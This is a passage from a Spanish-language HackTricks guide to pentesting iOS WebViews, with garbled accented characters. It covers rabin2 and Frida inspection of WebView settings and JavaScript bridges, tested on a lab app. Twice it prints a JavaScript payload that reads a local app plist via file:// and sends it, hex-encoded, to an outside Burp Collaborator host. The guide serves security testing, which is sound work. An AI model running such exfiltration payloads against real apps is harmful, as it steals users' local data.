es obsoleto a partir de iOS 12 y no deber√≠a ser utilizado. No se puede desactivar JavaScript.

**WKWebView**: Es la opci√≥n adecuada para extender la funcionalidad de la aplicaci√≥n y controlar el contenido mostrado. JavaScript est√° habilitado por defecto, pero gracias a la propiedad `javaScriptEnabled` de `WKWebView`, se puede desactivar completamente, evitando todas las vulnerabilidades de inyecci√≥n de script. La propiedad `JavaScriptCanOpenWindowsAutomatically` se puede utilizar para evitar que JavaScript abra nuevas ventanas, como pop-ups. La propiedad `hasOnlySecureContent` se puede utilizar para verificar que los recursos cargados por el WebView se recuperan a trav√©s de conexiones cifradas. `WKWebView` implementa el renderizado fuera de proceso, por lo que los errores de corrupci√≥n de memoria no afectar√°n al proceso principal de la aplicaci√≥n.

**SFSafariViewController**: Debe ser utilizado para proporcionar una experiencia de visualizaci√≥n web generalizada. Estos WebViews se pueden identificar f√°cilmente ya que tienen un dise√±o caracter√≠stico que incluye los siguientes elementos:

- Un campo de direcci√≥n de solo lectura con un indicador de seguridad.
- Un bot√≥n de acci√≥n ("Compartir").
- Un bot√≥n "Hecho", botones de navegaci√≥n hacia atr√°s y hacia adelante, y un bot√≥n "Safari" para abrir la p√°gina directamente en Safari.

JavaScript no se puede desactivar en `SFSafariViewController` y esta es una de las razones por las que se recomienda el uso de `WKWebView` cuando el objetivo es extender la interfaz de usuario de la aplicaci√≥n. `SFSafariViewController` tambi√©n comparte cookies y otros datos del sitio web con Safari. La actividad y la interacci√≥n del usuario con un `SFSafariViewController` no son visibles para la aplicaci√≥n, que no puede acceder a los datos de AutoFill, el historial de navegaci√≥n ni los datos del sitio web. Seg√∫n las Pautas de revisi√≥n de la App Store, los `SFSafariViewController` no pueden estar ocultos u oscurecidos por otras vistas o capas. 

## Descubriendo la configuraci√≥n de WebViews

### An√°lisis est√°tico

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**

WKWebView es una clase de iOS que permite mostrar contenido web en una aplicaci√≥n. Es una alternativa m√°s moderna y segura a UIWebView. WKWebView utiliza el motor de renderizado WebKit y proporciona una API m√°s rica para interactuar con el contenido web. 

Algunas de las caracter√≠sticas de WKWebView son:

- Soporte para JavaScript y HTML5.
- Comunicaci√≥n bidireccional entre la aplicaci√≥n y el contenido web mediante mensajes.
- Posibilidad de personalizar la apariencia del contenido web mediante CSS.
- Soporte para la carga de contenido web desde una URL o desde un archivo local.
- Posibilidad de interceptar y modificar las solicitudes de red realizadas por el contenido web.

En el contexto de la seguridad, es importante tener en cuenta que WKWebView puede ser vulnerable a ataques de Cross-Site Scripting (XSS) si no se toman las medidas adecuadas para validar y escapar los datos de entrada. Adem√°s, WKWebView puede filtrar informaci√≥n sensible, como cookies y tokens de autenticaci√≥n, si no se configura correctamente.
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
Alternativamente, tambi√©n puedes buscar los m√©todos conocidos de estas clases WebView. Por ejemplo, busca el m√©todo utilizado para inicializar un WKWebView ([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init)):
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### Probando la Configuraci√≥n de JavaScript

Para `WKWebView`s, como buena pr√°ctica, JavaScript deber√≠a estar deshabilitado a menos que sea expl√≠citamente requerido. Para verificar que JavaScript fue deshabilitado correctamente, busca en el proyecto los usos de `WKPreferences` y aseg√∫rate de que la propiedad [`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled) est√© establecida en `false`:
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
Si solo se tiene el binario compilado, se puede buscar lo siguiente en √©l:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### Probando OnlySecureContent

A diferencia de los `UIWebView`, cuando se utilizan `WKWebView`s es posible detectar contenido mixto (contenido HTTP cargado desde una p√°gina HTTPS). Al utilizar el m√©todo [`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent) se puede verificar si todos los recursos de la p√°gina se han cargado a trav√©s de conexiones cifradas de forma segura.\
En el binario compilado:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
Tambi√©n se puede buscar en el c√≥digo fuente o en las cadenas la cadena "http://". Sin embargo, esto no necesariamente significa que haya un problema de contenido mixto. Obtenga m√°s informaci√≥n sobre el contenido mixto en [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content).

### An√°lisis din√°mico

Es posible inspeccionar el heap a trav√©s de `ObjC.choose()` para encontrar instancias de los diferentes tipos de WebViews y tambi√©n buscar las propiedades `javaScriptEnabled` y `hasonlysecurecontent`:

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
  onMatch: function (ui) {
    console.log('onMatch: ', ui);
    console.log('URL: ', ui.request().toString());
  },
  onComplete: function () {
    console.log('done for UIWebView!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
  onMatch: function (sf) {
    console.log('onMatch: ', sf);
  },
  onComplete: function () {
    console.log('done for SFSafariViewController!');
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
  }
});

ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
  }
});
```
{% endcode %}

Cargalo con:
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## Manejo de protocolos WebView

Varios esquemas predeterminados est√°n disponibles que se interpretan en un WebView en iOS, por ejemplo:

* http(s)://
* file://
* tel://

Los WebViews pueden cargar contenido remoto desde un punto final, pero tambi√©n pueden cargar contenido local desde el directorio de datos de la aplicaci√≥n. Si se carga el contenido local, el usuario no deber√≠a poder influir en el nombre de archivo o la ruta utilizada para cargar el archivo, y los usuarios no deber√≠an poder editar el archivo cargado.

### Carga de contenido WebView

* **UIWebView**: Puede usar m√©todos obsoletos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) para cargar contenido.
* **WKWebView**: Puede usar los m√©todos [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) o [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) para cargar archivos HTML locales y `loadRequest:` para contenido web. Por lo general, los archivos locales se cargan en combinaci√≥n con m√©todos que incluyen, entre otros: [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource), [`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc) o [`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init). Adem√°s, tambi√©n debe verificar si la aplicaci√≥n est√° utilizando el m√©todo [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc). Su primer par√°metro es `URL` y contiene la URL que se cargar√° en el WebView, su segundo par√°metro `allowingReadAccessToURL` puede contener un solo archivo o un directorio. Si contiene un solo archivo, ese archivo estar√° disponible para el WebView. Sin embargo, si contiene un directorio, **todos los archivos de ese directorio estar√°n disponibles para el WebView**. Por lo tanto, vale la pena inspeccionar esto y, en caso de que sea un directorio, verificar que no se pueda encontrar informaci√≥n confidencial dentro de √©l.

Si tiene el c√≥digo fuente, puede buscar esos m√©todos. Si tiene el **binario compilado**, tambi√©n puede buscar estos m√©todos:
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### Acceso a archivos

* **UIWebView:**
  * El esquema `file://` siempre est√° habilitado.
  * El acceso a archivos desde URLs `file://` siempre est√° habilitado.
  * El acceso universal desde URLs `file://` siempre est√° habilitado.
  * Si se recupera el origen efectivo de un `UIWebView` donde `baseURL` tambi√©n est√° establecido en `nil`, se ver√° que no est√° establecido en "null", en su lugar se obtendr√° algo similar a lo siguiente: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d78`. Este origen "applewebdata://" es similar al origen "file://" ya que **no implementa la Pol√≠tica de Origen Com√∫n** y permite el acceso a archivos locales y cualquier recurso web. 

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
  * **`allowFileAccessFromFileURLs`** (`WKPreferences`, `false` por defecto): permite que JavaScript que se ejecuta en el contexto de una URL con esquema `file://` acceda a contenido de otras URLs con esquema `file://`.
  * **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, `false` por defecto): permite que JavaScript que se ejecuta en el contexto de una URL con esquema `file://` acceda a contenido de cualquier origen.

Puedes buscar estas funciones en el c√≥digo fuente de la aplicaci√≥n o en el binario compilado.\
Adem√°s, puedes utilizar el siguiente script de frida para encontrar esta informaci√≥n:
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
  onMatch: function (wk) {
    console.log('onMatch: ', wk);
    console.log('URL: ', wk.URL().toString());
    console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
    console.log('allowFileAccessFromFileURLs: ',
            wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
    console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
    console.log('allowUniversalAccessFromFileURLs: ',
            wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
  },
  onComplete: function () {
    console.log('done for WKWebView!');
  }
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
        Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### Exfiltrar archivos arbitrarios
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
    var hex, i;
    var result = "";
    for (i=0; i<this.length; i++) {
        hex = this.charCodeAt(i).toString(16);
        result += ("000"+hex).slice(-4);
    }
    return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        var xhr2 = new XMLHttpRequest();
        xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
        xhr2.send(null);
    }
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## M√©todos nativos expuestos a trav√©s de WebViews

Desde iOS 7, Apple introdujo APIs que permiten la comunicaci√≥n entre el tiempo de ejecuci√≥n de JavaScript en la WebView y los objetos nativos Swift o Objective-C.

Hay dos formas fundamentales en que el c√≥digo nativo y JavaScript pueden comunicarse:

* **JSContext**: Cuando un bloque Objective-C o Swift se asigna a un identificador en un `JSContext`, JavaScriptCore envuelve autom√°ticamente el bloque en una funci√≥n JavaScript.
* **Protocolo JSExport**: Las propiedades, los m√©todos de instancia y los m√©todos de clase declarados en un protocolo heredado de `JSExport` se asignan a objetos JavaScript que est√°n disponibles para todo el c√≥digo JavaScript. Las modificaciones de objetos que est√°n en el entorno JavaScript se reflejan en el entorno nativo.

Tenga en cuenta que **solo los miembros de clase definidos en el protocolo `JSExport`** son accesibles para el c√≥digo JavaScript.\
Busque c√≥digo que asigne objetos nativos al `JSContext` asociado con una WebView y analice qu√© funcionalidad expone, por ejemplo, no se debe acceder ni exponer datos sensibles a las WebViews.\
En Objective-C, el `JSContext` asociado con una `UIWebView` se obtiene de la siguiente manera:
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
El c√≥digo JavaScript en un **`WKWebView` todav√≠a puede enviar mensajes de vuelta a la aplicaci√≥n nativa, pero a diferencia de `UIWebView`, no es posible hacer referencia directamente al `JSContext` de un `WKWebView`. En su lugar, la comunicaci√≥n se implementa utilizando un sistema de mensajer√≠a y la funci√≥n `postMessage`, que serializa autom√°ticamente los objetos JavaScript en objetos nativos Objective-C o Swift. Los manejadores de mensajes se configuran utilizando el m√©todo [`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add).

### Habilitando JavascriptBridge
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

    if enabled {
            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
            userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
```
### Enviando Mensajes

Agregar un controlador de mensajes de script con el nombre `"name"` (o `"javaScriptBridge"` en el ejemplo anterior) hace que la funci√≥n JavaScript `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` se defina en todos los marcos de todas las vistas web que usan el controlador de contenido del usuario. Luego se puede [usar desde el archivo HTML de esta manera](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33):
```javascript
function invokeNativeOperation() {
    value1 = document.getElementById("value1").value
    value2 = document.getElementById("value2").value
    window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
Una vez que se ejecuta la funci√≥n nativa, generalmente se **ejecutar√° alg√∫n JavaScript dentro de la p√°gina web** (ver `evaluateJavascript` a continuaci√≥n) y puede estar interesado en **anular la funci√≥n** que se va a ejecutar para **robar el resultado**.\
Por ejemplo, en el siguiente script, la funci√≥n **`javascriptBridgeCallBack`** se ejecutar√° con 2 par√°metros (la funci√≥n llamada y el **resultado**). Si controla el HTML que se va a cargar, puede crear una **alerta con el resultado** de la siguiente manera:
```markup
<html>
    <script>
        document.location = "javascriptbridge://getSecret"
        function javascriptBridgeCallBack(name, result) {
            alert(result);
        }
    </script>
</html>
```
### Funci√≥n llamada

La funci√≥n llamada se encuentra en [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29):
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### Pruebas

Para probar el env√≠o de un postMessage dentro de una aplicaci√≥n, se puede:

* Cambiar la respuesta del servidor (MitM)
* Realizar una instrumentaci√≥n din√°mica e inyectar la carga √∫til de JavaScript utilizando frameworks como Frida y las correspondientes funciones de evaluaci√≥n de JavaScript disponibles para los iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) para `UIWebView` y [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) para `WKWebView`).

## Depuraci√≥n de iOS WebViews

(Tutorial de [https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews))

En los webviews de iOS, los mensajes enviados a `console.log()` _no_ se imprimen en los registros de Xcode. Todav√≠a es relativamente f√°cil depurar el contenido web con las herramientas de desarrollador de Safari, aunque hay un par de limitaciones:

* La depuraci√≥n de los webviews de iOS requiere Safari, por lo que su ordenador de desarrollo debe estar ejecutando macOS.
* Solo se pueden depurar los webviews en aplicaciones cargadas en su dispositivo a trav√©s de Xcode. No se pueden depurar los webviews en aplicaciones instaladas a trav√©s de la App Store o Apple Configurator.

Con esas limitaciones en mente, aqu√≠ est√°n los pasos para depurar de forma remota un webview en iOS:

* Primero, habilite el Inspector web de Safari en su dispositivo iOS abriendo la aplicaci√≥n _Configuraci√≥n_ de iOS, navegando a **Configuraci√≥n > Safari > Avanzado**, y activando la opci√≥n _Inspector web_.

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* A continuaci√≥n, tambi√©n debe habilitar las herramientas de desarrollador en Safari en su ordenador de desarrollo. Inicie Safari en su m√°quina de desarrollo y navegue a **Safari > Preferencias** en la barra de men√∫. En el panel de preferencias que aparece, haga clic en la pesta√±a _Avanzado_ y luego habilite la opci√≥n _Mostrar men√∫ Desarrollar_ en la parte inferior. Despu√©s de hacer eso, puede cerrar el panel de preferencias.

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* Conecte su dispositivo iOS a su ordenador de desarrollo y lance su aplicaci√≥n.
* En Safari en su ordenador de desarrollo, haga clic en _Desarrollar_ en la barra de men√∫ y coloque el cursor sobre la opci√≥n desplegable que es el nombre de su dispositivo iOS para mostrar una lista de instancias de webview que se ejecutan en su dispositivo iOS.

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* Haga clic en la opci√≥n desplegable del webview que desea depurar. Esto abrir√° una nueva ventana de Safari Web Inspector para inspeccionar el webview.

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## Referencias

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- ¬øTrabaja en una **empresa de ciberseguridad**? ¬øQuiere ver su **empresa anunciada en HackTricks**? ¬øO quiere tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulte los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!

- Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenga el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)

- **√önase al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠game** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Comparta sus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
